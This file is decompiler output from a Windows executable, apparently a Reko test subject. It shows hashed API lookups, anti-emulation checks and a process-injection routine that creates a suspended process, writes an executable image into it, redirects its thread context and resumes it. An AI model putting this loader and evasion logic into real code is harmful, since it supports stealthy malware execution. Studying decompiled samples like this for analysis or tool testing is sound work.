// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 0040100B: Register Eq_2 Win32CrtStartup()
DWORD Win32CrtStartup()
{
	globals->ptr4041B8 = fn004014B0(LoadLibraryA(globals->t404008), 0x647503D7);
	globals->ptr4041BC = fn004014B0(null, 3103470006);
	globals->ptr4041C0 = fn004014B0(null, ~0x49CE628E);
	globals->ptr4041C4 = fn004014B0(null, 2287583851);
	globals->ptr4041C8 = fn004014B0(null, 0x8859EA6B);
	globals->ptr4041CC = fn004014B0(null, 4103878185);
	globals->ptr4041D0 = fn004014B0(null, 2252249024);
	globals->ptr4041D4 = fn004014B0(null, 445514251);
	globals->ptr4041D8 = fn004014B0(null, 1203243316);
	globals->ptr4041DC = fn004014B0(null, 1992264094);
	globals->ptr4041E0 = fn004014B0(null, 1992019742);
	globals->ptr4041E4 = fn004014B0(null, 2002683038);
	globals->ptr4041E8 = fn004014B0(null, 1730943013);
	globals->ptr4041EC = fn004014B0(null, 78561712);
	globals->ptr4041F0 = fn004014B0(null, 0x0EEED9CD);
	ptr32 esp_282;
	word32 ebp_283;
	byte SCZO_284;
	word32 ebx_285;
	word32 esi_286;
	word32 eax_287;
	word32 edx_288;
	byte SZO_289;
	byte C_290;
	word32 ecx_291;
	byte cl_292;
	globals->ptr4041E0();
	*(esp_282 - 0x04) = globals->dw40403C;
	*(esp_282 - 0x08) = fp - 0x30;
	ptr32 esp_308;
	word32 ebp_309;
	byte SCZO_310;
	word32 ebx_311;
	word32 esi_312;
	word32 eax_313;
	word32 edx_314;
	byte SZO_315;
	byte C_316;
	word32 ecx_317;
	byte cl_318;
	globals->ptr4041DC();
	*(esp_308 - 0x04) = globals->dw404018;
	*(esp_308 - 0x08) = fp - 0x30;
	ptr32 esp_339;
	word32 ebp_340;
	byte SCZO_341;
	word32 ebx_342;
	word32 esi_343;
	word32 eax_344;
	word32 edx_345;
	byte SZO_346;
	byte C_347;
	word32 ecx_348;
	byte cl_349;
	globals->ptr4041DC();
	*(esp_339 - 0x04) = globals->dw40400C;
	*(esp_339 - 0x08) = fp - 0x30;
	ptr32 esp_367;
	word32 ebp_368;
	byte SCZO_369;
	word32 ebx_370;
	word32 esi_371;
	word32 eax_372;
	word32 edx_373;
	byte SZO_374;
	byte C_375;
	word32 ecx_376;
	byte cl_377;
	globals->ptr4041DC();
	*(esp_367 - 0x04) = fp - 0x30;
	ptr32 esp_393;
	word32 ebp_394;
	byte SCZO_395;
	word32 ebx_396;
	word32 esi_397;
	word32 eax_398;
	word32 edx_399;
	byte SZO_400;
	byte C_401;
	word32 ecx_402;
	byte cl_403;
	globals->ptr4041D8();
	*(esp_393 - 0x04) = 0x74D8B47E;
	*(esp_393 - 0x08) = eax_398;
	globals->ptr4041F4 = fn004014B0(dwArg00, dwArg04);
	*(esp_393 - 0x04) = 2182984901;
	*(esp_393 - 0x08) = 0x00;
	globals->ptr4041F8 = fn004014B0(dwArg00, dwArg04);
	*(esp_393 - 0x04) = 0x9A399F22;
	*(esp_393 - 0x08) = 0x00;
	globals->ptr4041FC = fn004014B0(dwArg00, dwArg04);
	*(esp_393 - 0x04) = 946146086;
	*(esp_393 - 0x08) = 0x00;
	globals->ptr404200 = fn004014B0(dwArg00, dwArg04);
	*(esp_393 - 0x04) = 998627677;
	*(esp_393 - 0x08) = 0x00;
	globals->ptr404204 = fn004014B0(dwArg00, dwArg04);
	*(esp_393 - 0x04) = globals->dw404010;
	ptr32 esp_497;
	word32 ebp_498;
	byte SCZO_499;
	word32 ebx_500;
	word32 esi_501;
	word32 eax_502;
	word32 edx_503;
	byte SZO_504;
	byte C_505;
	word32 ecx_506;
	byte cl_507;
	globals->ptr4041D8();
	*(esp_497 - 0x04) = ~0x22B0BE74;
	*(esp_497 - 0x08) = eax_502;
	globals->ptr404208 = fn004014B0(dwArg00, dwArg04);
	fn004016BD();
	*(esp_497 - 0x04) = 0x00;
	word32 esp_559;
	word32 ebp_560;
	byte SCZO_561;
	word32 ebx_562;
	word32 esi_563;
	word32 eax_564;
	word32 edx_565;
	byte SZO_566;
	byte C_567;
	word32 ecx_568;
	byte cl_569;
	globals->ptr4041D4();
	return 0x00;
}

// 004014B0: Register word32 fn004014B0(Stack Eq_5 dwArg04, Stack uint32 dwArg08)
word32 fn004014B0(HMODULE dwArg04, uint32 dwArg08)
{
	ptr32 v5_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	struct Eq_365 * eax_71 = dwArg04 + (&(dwArg04 + dwArg04->ptr003C / 0x0040)->ptr003C)[0x0F] / 0x0040;
	word16 eax_75[] = dwArg04 + eax_71->dw0024 / 0x0040;
	if (SetFileSecurityA(null, 0x00, null) != 0x00)
		dwArg08 = dwArg08 + 31220;
	if (SetFileSecurityA((CHAR *) 666, 0x00, null) == 0x00)
		dwArg08 = dwArg08 + 0x000C679D;
	word32 eax_119[] = dwArg04 + eax_71->dw0020 / 0x0040;
	word32 eax_124[] = dwArg04 + eax_71->dw001C / 0x0040;
	int32 esi_126 = 0x00;
	while (true)
	{
		word32 eax_157;
		if (esi_126 >= eax_71->dw0018)
			break;
		uint32 eax_177 = 0x00;
		Eq_439 (* ecx_193)[] = dwArg04 + eax_119[esi_126] / 0x0040;
		dwLoc3C = dwLoc3C & 0x00;
		while (Mem17[dwLoc3C + ecx_193:byte] != 0x00)
		{
			eax_177 = (eax_177 << 0x07 | eax_177 >>u 0x19) ^ ((int32) Mem17[dwLoc3C + ecx_193:byte] ^ 0x55);
			dwLoc3C = dwLoc3C + 0x01;
		}
		if (eax_177 == dwArg08)
		{
			eax_157 = dwArg04 + eax_124[(word32) eax_75[esi_126]] / 0x0040;
			goto l004016AA;
		}
		esi_126 = esi_126 + 0x01;
	}
	eax_157 = 0x00;
l004016AA:
	fs->ptr0000 = v5_14;
	return eax_157;
}

// 004016BD: void fn004016BD()
void fn004016BD()
{
	GetModuleFileNameA(null, &globals->t40420C, 0x0104);
	ptr32 esp_53;
	word32 ebp_54;
	byte SCZO_55;
	word32 ebx_56;
	word32 esi_57;
	word32 edi_58;
	word32 eax_59;
	word32 edx_60;
	word32 ecx_61;
	byte SZO_62;
	byte C_63;
	byte cl_64;
	globals->ptr4041E0();
	*(esp_53 - 0x04) = globals->dw404000;
	*(esp_53 - 0x08) = 0x00404310;
	ptr32 esp_80;
	word32 ebp_81;
	byte SCZO_82;
	word32 ebx_83;
	word32 esi_84;
	word32 edi_85;
	word32 eax_86;
	word32 edx_87;
	word32 ecx_88;
	byte SZO_89;
	byte C_90;
	byte cl_91;
	globals->ptr4041DC();
	*(esp_80 - 0x04) = globals->dw40401C;
	*(esp_80 - 0x08) = 0x00404310;
	ptr32 esp_101;
	word32 ebp_102;
	byte SCZO_103;
	word32 ebx_104;
	word32 esi_105;
	word32 edi_106;
	word32 eax_107;
	word32 edx_108;
	word32 ecx_109;
	byte SZO_110;
	byte C_111;
	byte cl_112;
	globals->ptr4041DC();
	*(esp_101 - 0x04) = globals->dw404038;
	*(esp_101 - 0x08) = 0x00404310;
	ptr32 esp_128;
	word32 ebp_129;
	byte SCZO_130;
	word32 ebx_131;
	word32 esi_132;
	word32 edi_133;
	word32 eax_134;
	word32 edx_135;
	word32 ecx_136;
	byte SZO_137;
	byte C_138;
	byte cl_139;
	globals->ptr4041DC();
	*(esp_128 - 0x04) = 4211212;
	*(esp_128 - 0x08) = 0x00404310;
	ptr32 esp_154;
	word32 ebp_155;
	byte SCZO_156;
	word32 ebx_157;
	word32 esi_158;
	word32 edi_159;
	word32 eax_160;
	word32 edx_161;
	word32 ecx_162;
	byte SZO_163;
	byte C_164;
	byte cl_165;
	globals->ptr4041DC();
	globals->dw404414 = 0x44;
	globals->dw404440 = 0x01;
	globals->w404444 = 0x02;
	*(esp_154 - 0x04) = 0x00404458;
	*(esp_154 - 0x08) = 0x00404414;
	*(esp_154 - 0x0C) = 0x00;
	*(esp_154 - 0x10) = 0x00;
	*(esp_154 - 0x14) = 0x04;
	*(esp_154 - 0x18) = 0x00;
	*(esp_154 - 0x1C) = 0x00;
	*(esp_154 - 0x20) = 0x00;
	*(esp_154 - 0x24) = 0x00404310;
	*(esp_154 - 0x28) = 0x00;
	ptr32 esp_212;
	word32 ebp_213;
	byte SCZO_214;
	word32 ebx_215;
	word32 esi_216;
	word32 edi_217;
	word32 eax_218;
	word32 edx_219;
	word32 ecx_220;
	byte SZO_221;
	byte C_222;
	byte cl_223;
	globals->ptr4041B8();
	*(esp_212 - 0x04) = 0x00;
	Eq_5 eax_233 = GetModuleHandleA(*(esp_212 - 0x04));
	Eq_687 eax_257 = eax_233 + eax_233->ptr003C / 0x0040;
	*(esp_212 - 0x08) = 0x40;
	*(esp_212 - 0x0C) = 0x3000;
	*(esp_212 - 0x10) = eax_257->dw0050;
	*(esp_212 - 0x14) = (HMODULE *) eax_233;
	*(esp_212 - 0x18) = globals->dw404458;
	ptr32 esp_280;
	word32 ebp_281;
	byte SCZO_282;
	word32 ebx_283;
	struct Eq_728 * esi_284;
	word32 edi_285;
	word32 eax_286;
	word32 edx_287;
	word32 ecx_288;
	byte SZO_289;
	byte C_290;
	byte cl_291;
	globals->ptr4041BC();
	*(esp_280 - 0x04) = fp - 0x14;
	*(esp_280 - 0x08) = esi_284->dw0050;
	*(esp_280 - 0x0C) = ebx_283;
	*(esp_280 - 0x10) = eax_286;
	*(esp_280 - 0x14) = globals->dw404458;
	ptr32 esp_321;
	word32 ebp_322;
	byte SCZO_323;
	word32 ebx_324;
	word32 esi_325;
	word32 edi_326;
	word32 eax_327;
	word32 edx_328;
	word32 ecx_329;
	byte SZO_330;
	byte C_331;
	byte cl_332;
	globals->ptr4041C0();
	globals->dw404468 = 0x00010007;
	*(esp_321 - 0x04) = 0x00404468;
	*(esp_321 - 0x08) = globals->dw40445C;
	ptr32 esp_351;
	word32 ebp_352;
	byte SCZO_353;
	word32 ebx_354;
	word32 esi_355;
	word32 edi_356;
	word32 eax_357;
	word32 edx_358;
	word32 ecx_359;
	byte SZO_360;
	byte C_361;
	byte cl_362;
	globals->ptr4041C4();
	globals->dw404520 = 0x00401D2D;
	*(esp_351 - 0x04) = 0x00404468;
	*(esp_351 - 0x08) = globals->dw40445C;
	ptr32 esp_393;
	word32 ebp_394;
	byte SCZO_395;
	word32 ebx_396;
	word32 esi_397;
	word32 edi_398;
	word32 eax_399;
	word32 edx_400;
	word32 ecx_401;
	byte SZO_402;
	byte C_403;
	byte cl_404;
	globals->ptr4041C8();
	*(esp_393 - 0x04) = globals->dw40445C;
	word32 esp_417;
	word32 ebp_418;
	byte SCZO_419;
	word32 ebx_420;
	word32 esi_421;
	word32 edi_422;
	word32 eax_423;
	word32 edx_424;
	word32 ecx_425;
	byte SZO_426;
	byte C_427;
	byte cl_428;
	globals->ptr4041CC();
}

